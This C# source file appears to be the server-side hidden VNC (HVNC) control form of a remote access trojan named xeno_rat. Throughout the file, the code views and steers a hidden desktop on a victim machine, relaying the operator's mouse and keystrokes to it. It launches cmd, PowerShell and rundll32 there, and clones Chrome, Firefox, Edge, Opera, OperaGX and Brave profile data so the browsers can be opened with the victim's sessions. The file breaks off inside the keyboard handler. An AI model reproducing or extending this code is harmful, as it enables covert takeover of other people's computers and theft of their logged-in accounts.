using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Hvnc : Form
    {
        Node client;
        Node ImageNode;
        string DesktopName = "hidden_desktop";
        bool playing = false;
        bool is_cloning_browser = false;
        string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        CustomPictureBox customPictureBox1;
        public Hvnc(Node _client)
        {
            client = _client;
            InitializeComponent();
            InitializeAsync();
        }

        /// <summary>
        /// Initializes the asynchronous task by creating an image node, adding temporary on disconnect actions, sending data to the client, and setting up a custom picture box.
        /// </summary>
        /// <returns>An asynchronous task representing the initialization process.</returns>
        /// <remarks>
        /// This method initializes the ImageNode by awaiting the creation of an image node using the CreateImageNode method.
        /// It then adds temporary on disconnect actions to the ImageNode and the client using the AddTempOnDisconnect method.
        /// After that, it sends data to the client using the SendAsync method with the UTF8-encoded DesktopName.
        /// Next, it sets up a custom picture box by creating a new CustomPictureBox with the client, setting its properties, removing the original picture box from the controls, and adding the custom picture box to the controls.
        /// Finally, it adds items from the qualitys array to comboBox1 and awaits the RecvThread method.
        /// </remarks>
        private async Task InitializeAsync()
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            client.AddTempOnDisconnect(TempOnDisconnect);
            await client.SendAsync(Encoding.UTF8.GetBytes(DesktopName));
            customPictureBox1 = new CustomPictureBox(client);
            customPictureBox1.Name = "pictureBox1";
            customPictureBox1.Size = pictureBox1.Size;
            customPictureBox1.Location = pictureBox1.Location;
            customPictureBox1.Image = pictureBox1.Image;
            customPictureBox1.SizeMode = pictureBox1.SizeMode;
            customPictureBox1.Anchor = pictureBox1.Anchor;
            Controls.Remove(pictureBox1);
            Controls.Add(customPictureBox1);
            comboBox1.Items.AddRange(qualitys);
            await RecvThread();
        }

        /// <summary>
        /// Processes a command key and triggers the WndProc method for a custom picture box control.
        /// </summary>
        /// <param name="msg">A <see cref="Message"/> that represents the window message to process.</param>
        /// <param name="keyData">A <see cref="Keys"/> that represents the key data for the keyboard input.</param>
        /// <returns>Always returns true after triggering the WndProc method for the custom picture box control.</returns>
        /// <remarks>
        /// This method overrides the base class's ProcessCmdKey method to handle keyboard input and trigger the WndProc method for a custom picture box control.
        /// The custom picture box control's WndProc method is triggered to process the specified window message.
        /// </remarks>
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            customPictureBox1.TriggerWndProc(ref msg);
            return true;
            //return base.ProcessCmdKey(ref msg, keyData);
        }

        /// <summary>
        /// Asynchronously sends a byte array to the client.
        /// </summary>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initiates the sending of a byte array to the client using an asynchronous operation.
        /// </remarks>
        public async Task start()
        {
            await client.SendAsync(new byte[] { 0 });
        }

        /// <summary>
        /// Stops the asynchronous operation and sends a byte with value 1 using the client.
        /// </summary>
        /// <remarks>
        /// This method stops the asynchronous operation and sends a byte with value 1 using the client.
        /// </remarks>
        public  async Task stop()
        {
            await client.SendAsync(new byte[] { 1 });
        }

        /// <summary>
        /// Sets the quality of the client's socket and sends the updated quality value.
        /// </summary>
        /// <param name="quality">The quality value to be set for the client's socket.</param>
        /// <remarks>
        /// This method sets the quality of the client's socket to the specified <paramref name="quality"/> value and sends the updated quality value using the SendAsync method of the client.
        /// </remarks>
        public async Task SetQuality(int quality)
        {   
            await client.SendAsync(client.sock.Concat(new byte[] { 2 }, client.sock.IntToBytes(quality)));
        }

        /// <summary>
        /// Handles the disconnection of a node by disconnecting the client and image node if the specified node is the client or the image node.
        /// </summary>
        /// <param name="node">The node to be disconnected.</param>
        /// <remarks>
        /// If the specified <paramref name="node"/> is the client or the image node, this method disconnects the client and image node if it is not null.
        /// Additionally, if the current object is not disposed, it closes the form using the <see cref="System.Windows.Forms.Control.Invoke"/> method.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Asynchronously receives image data and updates the custom picture box with the received image.
        /// </summary>
        /// <remarks>
        /// This method continuously receives image data while the ImageNode is connected. Upon receiving the data, it creates an Image object from the received byte array and updates the custom picture box with the new image. If the custom picture box already contains an image, it disposes of the existing image before updating it with the new one.
        /// </remarks>
        public async Task RecvThread()
        {
            while (ImageNode.Connected())
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {
                        Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = Image.FromStream(ms);
                        }

                        customPictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (customPictureBox1.Image != null)
                            {
                                customPictureBox1.Image.Dispose();
                                customPictureBox1.Image = null;
                            }
                            customPictureBox1.Image = image;
                        }));
                    }
                    catch { }
                }
            }
        }

        /// <summary>
        /// Starts a process by sending the specified path to the client.
        /// </summary>
        /// <param name="path">The path of the process to be started.</param>
        /// <remarks>
        /// This method sends the specified path to the client to start a process. If the <paramref name="playing"/> flag is false, the method returns without starting the process.
        /// </remarks>
        private async Task StartProc(string path) 
        {
            if (!playing) return;
            await client.SendAsync(client.sock.Concat(new byte[] { 5 }, Encoding.UTF8.GetBytes(path)));
            await client.SendAsync(new byte[] { 5 });
        }

        /// <summary>
        /// Enables browser cloning if not already enabled and the application is in playing state.
        /// </summary>
        /// <remarks>
        /// This method sends a byte array with value 6 to the client to enable browser cloning.
        /// It sets the <paramref name="is_cloning_browser"/> flag to true to indicate that browser cloning is enabled.
        /// </remarks>
        private async Task EnableBrowserClone() 
        {
            if (!playing || is_cloning_browser) return;
            await client.SendAsync(new byte[] { 6 });
            is_cloning_browser = true;
        }

        /// <summary>
        /// Disables the cloning of the browser if currently active.
        /// </summary>
        /// <remarks>
        /// This method checks if the application is in a playing state and if the browser is currently being cloned.
        /// If both conditions are met, it sends a byte array with the value 7 to the client to disable the cloning of the browser.
        /// Once the operation is completed, the method sets the flag for browser cloning to false.
        /// </remarks>
        /// <exception cref="InvalidOperationException">
        /// Thrown when the method is called while not in a playing state or when the browser is not being cloned.
        /// </exception>
        /// <returns>
        /// An asynchronous task representing the operation.
        /// </returns>
        private async Task DisableBrowserClone()
        {
            if (!playing || !is_cloning_browser) return;
            await client.SendAsync(new byte[] { 7 });
            is_cloning_browser = false;
        }

        /// <summary>
        /// Starts the Chrome process if not already started and sends a byte array to the client.
        /// </summary>
        /// <remarks>
        /// This method checks if the application is in a playing state, and if not, it returns without starting the Chrome process.
        /// If the application is in a playing state, it sends a byte array to the client using an asynchronous operation.
        /// </remarks>
        private async Task StartChrome() 
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 8 });
        }

        /// <summary>
        /// Starts the Firefox application asynchronously.
        /// </summary>
        /// <remarks>
        /// This method sends a signal to start the Firefox application if the <paramref name="playing"/> flag is set to true.
        /// </remarks>
        private async Task StartFirefox()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 9 });
        }

        /// <summary>
        /// Starts the edge and sends a byte array to the client asynchronously.
        /// </summary>
        /// <remarks>
        /// This method checks if the edge is currently playing, and if not, it returns without performing any action.
        /// If the edge is playing, it sends a byte array with a single element (10) to the client asynchronously using the <paramref name="client"/>.
        /// </remarks>
        private async Task StartEdge()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 10 });
        }

        /// <summary>
        /// Starts the opera if not already playing.
        /// </summary>
        /// <remarks>
        /// This method sends a signal to start the opera if the <paramref name="playing"/> flag is set to true.
        /// If the <paramref name="playing"/> flag is false, the method returns without performing any action.
        /// </remarks>
        private async Task StartOpera()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 11 });
        }

        /// <summary>
        /// Starts the OperaGX application asynchronously.
        /// </summary>
        /// <remarks>
        /// This method sends a byte array with a value of 12 to the client to start the OperaGX application.
        /// If the <paramref name="playing"/> flag is not set, the method returns without performing any action.
        /// </remarks>
        /// <returns>An asynchronous task representing the operation.</returns>
        private async Task StartOperaGX()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 12 });
        }

        /// <summary>
        /// Starts the Brave action asynchronously.
        /// </summary>
        /// <remarks>
        /// This method sends a byte array with the value 13 to the client to initiate the Brave action.
        /// The method is asynchronous and will return a Task object.
        /// If the <paramref name="playing"/> flag is not set, the method will return without performing any action.
        /// </remarks>
        /// <exception cref="InvalidOperationException">
        /// Thrown if the <paramref name="playing"/> flag is not set.
        /// </exception>
        /// <returns>
        /// A task representing the asynchronous operation.
        /// </returns>
        private async Task StartBrave()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 13 });
        }

        /// <summary>
        /// Creates an image node and returns it. If the image node already exists, returns the existing node.
        /// </summary>
        /// <returns>The created or existing image node.</returns>
        /// <remarks>
        /// This method first checks if the ImageNode already exists, and if so, returns it.
        /// If the ImageNode does not exist, it creates a new SubSubNode using the client's Parent and awaits the result.
        /// It then sets the type and ID for the SubSubNode using Utils.SetType2setIdAsync method and awaits the result.
        /// If the ID is valid (not -1), it sets the type and returns the SubSubNode using Utils.Type2returnAsync method and awaits the result.
        /// It then sends the ID to the client using client.SendAsync method and awaits the result.
        /// It receives a response from the client using client.ReceiveAsync method and awaits the result.
        /// If the response is null or the first byte is 0, it disconnects the SubSubNode and returns null.
        /// If the ID is invalid (-1), it disconnects the SubSubNode and returns null.
        /// If all steps are successful, it returns the SubSubNode as the created or existing image node.
        /// </remarks>
        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Event handler for the load event of the Hvnc form.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
        private void Hvnc_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Enables the checkbox, starts the asynchronous operation, disables the button, and sets the playing flag to true.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method enables the checkbox, starts an asynchronous operation using the <see cref="start"/> method, disables the button, and sets the playing flag to true.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            //start
            checkBox1.Enabled = true;
            await start();
            button1.Enabled = false;
            playing = true;
        }

        /// <summary>
        /// Disables the checkbox, stops the asynchronous operation, enables button1, and disposes the image in customPictureBox1 if it is not null.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method disables the checkbox, stops the asynchronous operation using the stop method, enables button1, and disposes the image in customPictureBox1 if it is not null. If an exception occurs during disposing the image, it is caught and ignored.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            //stop
            checkBox1.Enabled = false;
            await stop();
            button1.Enabled = true;
            playing = false;
            try
            {
                if (customPictureBox1.Image != null)
                {
                    customPictureBox1.Image.Dispose();
                    customPictureBox1.Image = null;
                }
            }
            catch { }
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox1. Sets the quality based on the selected index.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method retrieves the selected index from comboBox1 and sets the quality based on the selected index.
        /// If the selected index is not -1, it calls the SetQuality method with the quality value parsed from the qualitys array at the selected index.
        /// </remarks>
        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
            }
        }

        /// <summary>
        /// Sends a signal to the client if the application is currently in a playing state.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method sends a signal to the client if the application is currently in a playing state.
        /// If the application is not in a playing state, no action is taken.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 4 });
        }

        /// <summary>
        /// Starts a process using the specified file path.
        /// </summary>
        /// <param name="filePath">The file path of the process to be started.</param>
        /// <remarks>
        /// This method asynchronously starts a process using the specified file path.
        /// </remarks>
        private async void button4_Click(object sender, EventArgs e)
        {
            await StartProc(@"C:\Windows\System32\rundll32.exe shell32.dll,#61");
        }

        /// <summary>
        /// Handles the click event of button5, starts the Edge browser, and displays a message if the browser cloning is in progress.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts the Edge browser and displays a message if the browser cloning is in progress.
        /// </remarks>
        private async void button5_Click(object sender, EventArgs e)
        {
            await StartEdge();
            if (is_cloning_browser) 
            {
               new Thread(()=>MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        /// <summary>
        /// Starts a new instance of Chrome browser and displays a message if the browser profile data is being cloned.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts a new instance of the Chrome browser. If the browser profile data is being cloned, it displays a message indicating that it may take some time and advises the user to wait for the browser to launch.
        /// </remarks>
        private async void button6_Click(object sender, EventArgs e)
        {
            await StartChrome();
            if (is_cloning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        /// <summary>
        /// Starts a new instance of Firefox browser and displays a message if the browser profile data is being cloned.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts a new instance of the Firefox browser. If the browser profile data is being cloned, it displays a message indicating that it may take some time.
        /// </remarks>
        private async void button7_Click(object sender, EventArgs e)
        {
            await StartFirefox();
            if (is_cloning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        /// <summary>
        /// Initiates a new process for the command prompt.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts a new process for the command prompt using the "cmd" command.
        /// </remarks>
        private async void button8_Click(object sender, EventArgs e)
        {
            await StartProc("cmd");
        }

        /// <summary>
        /// Initiates a PowerShell process asynchronously.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method initiates a PowerShell process asynchronously using the StartProc method.
        /// </remarks>
        private async void button9_Click(object sender, EventArgs e)
        {
            await StartProc("powershell");
        }

        /// <summary>
        /// Event handler for the click event of pictureBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method is called when the pictureBox1 is clicked.
        /// </remarks>
        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the event when the state of the checkbox changes during playback.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method checks if the application is currently in a playing state. If not, it returns without performing any action.
        /// If the checkbox is checked, it asynchronously enables the browser cloning feature by calling the <see cref="EnableBrowserClone"/> method.
        /// If the checkbox is unchecked, it asynchronously disables the browser cloning feature by calling the <see cref="DisableBrowserClone"/> method.
        /// </remarks>
        private async void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (!playing) return;
            if (checkBox1.Checked)
            {
                await EnableBrowserClone();
            }
            else 
            {
                await DisableBrowserClone();
            }
        }

        /// <summary>
        /// Initiates the process to start the Opera browser asynchronously and displays a message if the browser cloning is in progress.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method initiates the process to start the Opera browser asynchronously using the <see cref="StartOpera"/> method.
        /// If the browser cloning is in progress, it displays a message indicating that it may take a while to clone the profile data and advises to wait if the browser doesn't launch.
        /// </remarks>
        private async void button12_Click(object sender, EventArgs e)
        {
            await StartOpera();
            if (is_cloning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        /// <summary>
        /// Initiates the process to start the OperaGX browser asynchronously.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts the OperaGX browser and displays a message if the browser profile data is being cloned.
        /// </remarks>
        private async void button11_Click(object sender, EventArgs e)
        {
            await StartOperaGX();
            if (is_cloning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        /// <summary>
        /// Handles the click event for button10, starts the Brave browser and displays a message if the browser profile data is being cloned.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously starts the Brave browser and displays a message if the browser profile data is being cloned.
        /// If the browser profile data is being cloned, a message box is displayed to inform the user that it may take a while for the process to complete.
        /// </remarks>
        private async void button10_Click(object sender, EventArgs e)
        {
            await StartBrave();
            if (is_cloning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }
    }


    public class CustomPictureBox : PictureBox
    {
        Node client;
        public CustomPictureBox(Node _client) 
        {
            client = _client;
        }

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled on or off.
        /// </summary>
        /// <param name="nVirtKey">The virtual-key code.</param>
        /// <returns>The return value specifies the status of the specified virtual key, as follows:
        /// If the high-order bit is 1, the key is down; otherwise, it is up.
        /// If the low-order bit is 1, the key is toggled. A key, such as the CAPS LOCK key, is toggled if it is turned on. The key is off and untoggled if the low-order bit is 0.
        /// </returns>
        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        // Constants for clipboard data formats
        public const uint CF_TEXT = 1;          // Text format
        public const uint CF_BITMAP = 2;        // Bitmap format
        public const uint CF_UNICODETEXT = 13;   // Unicode text format
        public const uint CF_HDROP = 15;         // File format

        /// <summary>
        /// Determines whether the specified clipboard format is available.
        /// </summary>
        /// <param name="format">The format to check for availability.</param>
        /// <returns>True if the specified clipboard format is available; otherwise, false.</returns>
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsClipboardFormatAvailable(uint format);

        /// <summary>
        /// Opens the clipboard for examination and prevents other applications from modifying the clipboard content.
        /// </summary>
        /// <param name="hWndNewOwner">A handle to the window that will own the clipboard.</param>
        /// <returns>True if the function succeeds; otherwise, false.</returns>
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenClipboard(IntPtr hWndNewOwner);

        /// <summary>
        /// Retrieves data from the clipboard in a specified format.
        /// </summary>
        /// <param name="uFormat">The format of the data to be retrieved from the clipboard.</param>
        /// <returns>The handle to the data in the specified format, or <see cref="IntPtr.Zero"/> if the clipboard is empty or does not contain data in the specified format.</returns>
        [DllImport("user32.dll")]
        public static extern IntPtr GetClipboardData(uint uFormat);

        /// <summary>
        /// Closes the clipboard.
        /// </summary>
        /// <returns>True if the clipboard is closed successfully; otherwise, false.</returns>
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseClipboard();

        /// <summary>
        /// Translates a Unicode character to the corresponding virtual-key code and shift state for the current keyboard.
        /// </summary>
        /// <param name="c">The Unicode character to be translated.</param>
        /// <returns>The low-order byte specifies the virtual-key code, and the high-order byte specifies the shift state, which can be a combination of the following flag bits: 1 for SHIFT, 2 for CTRL, and 4 for ALT. If the function returns -1, the character is a dead key or is not translatable.</returns>
        [DllImport("user32.dll")]
        static extern short VkKeyScan(char c);

        /// <summary>
        /// Translates the specified virtual-key code and keyboard state to the corresponding character or characters.
        /// </summary>
        /// <param name="uVirtKey">The virtual-key code to be translated.</param>
        /// <param name="uScanCode">The hardware scan code of the key to be translated.</param>
        /// <param name="lpKeyState">An array of 256 bytes containing the current keyboard state.</param>
        /// <param name="lpChar">When the function returns, contains the character corresponding to the specified key code.</param>
        /// <param name="uFlags">The behavior of the function. This parameter can be 0 or 1.</param>
        /// <returns>Returns 1 if the specified key is a dead-key character; otherwise, it returns 0.</returns>
        /// <remarks>
        /// This method translates the specified virtual-key code and keyboard state to the corresponding character or characters.
        /// It is used to translate a virtual-key code into the corresponding character value for the current keyboard layout.
        /// If the specified key is a dead-key character, the return value is 1; otherwise, it is 0.
        /// </remarks>
        [DllImport("user32.dll")]
        public static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, out uint lpChar, uint uFlags);

        /// <summary>
        /// Translates the coordinates from the original screen size to the target control's image size and returns the translated coordinates.
        /// </summary>
        /// <param name="originalCoords">The original coordinates to be translated.</param>
        /// <param name="originalScreenSize">The original screen size.</param>
        /// <param name="targetControl">The target control to which the coordinates are being translated.</param>
        /// <returns>The translated coordinates on the target control's image.</returns>
        public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
        {
            // Calculate the scaling factors
            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;

            // Apply the scaling factors
            int scaledX = (int)(originalCoords.X * scaleX);
            int scaledY = (int)(originalCoords.Y * scaleY);

            // Get the unzoomed and offset-adjusted coordinates
            Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));

            return translatedCoords;
        }

        /// <summary>
        /// Retrieves the data format currently on the clipboard and performs corresponding actions based on the format.
        /// </summary>
        /// <remarks>
        /// This method checks the available clipboard formats and retrieves the data accordingly. If the clipboard contains text data, it retrieves and processes the text. If the clipboard contains bitmap data, it retrieves and processes the bitmap. If the clipboard contains Unicode text data, it retrieves and processes the Unicode text.
        /// </remarks>
        /// <exception cref="System.Runtime.InteropServices.ExternalException">Thrown when an error occurs while accessing the clipboard.</exception>
        public static void GetClipboardFormat()
        {
            if (!OpenClipboard(IntPtr.Zero))
                return;


            if (IsClipboardFormatAvailable(CF_TEXT))
            {
                IntPtr hGlobal = GetClipboardData(CF_TEXT);
                string clipboardText = Marshal.PtrToStringUni(hGlobal);
                Marshal.FreeHGlobal(hGlobal);
            }
            else if (IsClipboardFormatAvailable(CF_BITMAP))
            {
                IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                System.Drawing.Bitmap clipboardBitmap = System.Drawing.Bitmap.FromHbitmap(hBitmap);
                Marshal.FreeHGlobal(hBitmap);
            }
            else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
            {
                IntPtr hGlobal = GetClipboardData(CF_UNICODETEXT);
                string clipboardText = Marshal.PtrToStringUni(hGlobal);
                Marshal.FreeHGlobal(hGlobal);
            }

            CloseClipboard();
        }

        /// <summary>
        /// Translates and unzooms the given point based on the zoom factor and displayed image rectangle of the PictureBox.
        /// </summary>
        /// <param name="pictureBox">The PictureBox control used for displaying the image.</param>
        /// <param name="scaledPoint">The point with scaled coordinates.</param>
        /// <returns>The translated and unzoomed Point based on the zoom factor and displayed image rectangle of the PictureBox.</returns>
        /// <remarks>
        /// This method calculates the zoom factor based on the client size of the PictureBox and the dimensions of the displayed image.
        /// It then translates and unzooms the coordinates of the given point to match the original image size.
        /// </remarks>
        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
        {
            // Calculate the zoom factor
            float zoomFactor = Math.Min(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Get the displayed rectangle of the image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Offset and unzoom the coordinates
            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(translatedX, translatedY);
        }

        /// <summary>
        /// Gets the display rectangle for the image in the specified PictureBox.
        /// </summary>
        /// <param name="pictureBox">The PictureBox control containing the image.</param>
        /// <returns>A Rectangle representing the display area for the image.</returns>
        /// <remarks>
        /// This method calculates and returns the display rectangle for the image based on the PictureBox's SizeMode property.
        /// If the SizeMode is Normal, the display rectangle is set to the full size of the image.
        /// If the SizeMode is StretchImage, the display rectangle is set to the client area of the PictureBox.
        /// If the SizeMode is anything else, the display rectangle is calculated based on the zoom factor and centering within the client area.
        /// </remarks>
        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
        {
            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
            {
                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
            }
            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
            {
                return pictureBox.ClientRectangle;
            }
            else
            {
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);

                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;

                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
            }
        }

        /// <summary>
        /// Gets the modified key corresponding to the input character.
        /// </summary>
        /// <param name="c">The input character for which the modified key is to be retrieved.</param>
        /// <returns>The modified key corresponding to the input character, taking into account any shift key pressed.</returns>
        /// <remarks>
        /// This method retrieves the modified key corresponding to the input character by considering any shift key pressed.
        /// If no key translates to the input character, the method returns the input character itself.
        /// </remarks>
        public static char GetModifiedKey(char c)
        {
            short vkKeyScanResult = VkKeyScan(c);

            // a result of -1 indicates no key translates to input character
            if (vkKeyScanResult == -1)
                return c;

            // vkKeyScanResult & 0xff is the base key, without any modifiers
            uint code = (uint)vkKeyScanResult & 0xff;
            // set shift key pressed
            byte[] b = new byte[256];
            b[0x10] = 0x80;

            uint r;
            // return value of 1 expected (1 character copied to r)
            if (1 != ToAscii(code, code, b, out r, 0))
                return c;

            return (char)r;
        }

        /// <summary>
        /// Checks if the input character is alphanumeric.
        /// </summary>
        /// <param name="c">The character to be checked.</param>
        /// <returns>True if the input character is alphanumeric, otherwise false.</returns>
        public static bool IsAlphaNumeric(char c)
        {
            return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '1' && c <= '9');
        }

        /// <summary>
        /// Triggers the window procedure for processing Windows messages.
        /// </summary>
        /// <param name="m">A reference to the message to be processed.</param>
        /// <remarks>
        /// This method triggers the window procedure for processing Windows messages by calling the WndProc method and passing a reference to the message to be processed.
        /// </remarks>
        public void TriggerWndProc(ref Message m)
        {
            WndProc(ref m);
        }

        /// <summary>
        /// Overrides the WndProc method to handle window messages and sends corresponding data to the client.
        /// </summary>
        /// <param name="m">A reference to the Message structure that contains the window message to process.</param>
        /// <remarks>
        /// This method intercepts window messages and processes them based on the message type. If the Image property is not null, it processes mouse and keyboard events and sends the corresponding data to the client.
        /// For mouse events (e.g., left button down, right button up), it translates the coordinates, constructs a payload, and sends it asynchronously to the client.
        /// For keyboard events (e.g., key down, key up), it checks if the Shift or Caps Lock key is pressed, modifies the wParam accordingly, and sends the payload to the client.
        /// </remarks>
        protected override void WndProc(ref Message m)
        {
            if (this.Image == null)
            {
                base.WndProc(ref m);
                return;
            }
            byte[] payload;
            switch (m.Msg)
            {
                case 0x0201: // WM_LBUTTONDOWN
                case 0x0202: // WM_LBUTTONUP
                case 0x0204: // WM_RBUTTONDOWN
                case 0x0205: // WM_RBUTTONUP
                case 0x0207: // WM_MBUTTONDOWN
                case 0x0208: // WM_MBUTTONUP
                case 0x0203: // WM_LBUTTONDBLCLK
                case 0x0206: // WM_RBUTTONDBLCLK
                case 0x0209: // WM_MBUTTONDBLCLK
                case 0x0200: // WM_MOUSEMOVE
                case 0x020A: // WM_MOUSEWHEEL
                    int x = (int)(m.LParam.ToInt32() & 0xFFFF);
                    int y = (int)((m.LParam.ToInt32() >> 16) & 0xFFFF);
                    Point newpoint = TranslateCoordinates(new Point(x, y), this.Image.Size, this);
                    x = newpoint.X;
                    y = newpoint.Y;

                    m.LParam = (IntPtr)((y << 16) | (x & 0xFFFF));

                    uint msg = (uint)m.Msg;
                    IntPtr wParam = m.WParam;
                    IntPtr lParam = m.LParam;
                    int Imsg = (int)msg;
                    int IwParam = (int)wParam;
                    int IlParam = (int)lParam;
                    Task.Run(async () =>
                    {
                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
                        await client.SendAsync(payload);
                    }).Wait();
                    break;

                case 0x0302: //WM_PASTE
                    break;

                case 0x0100: //WM_KEYDOWN
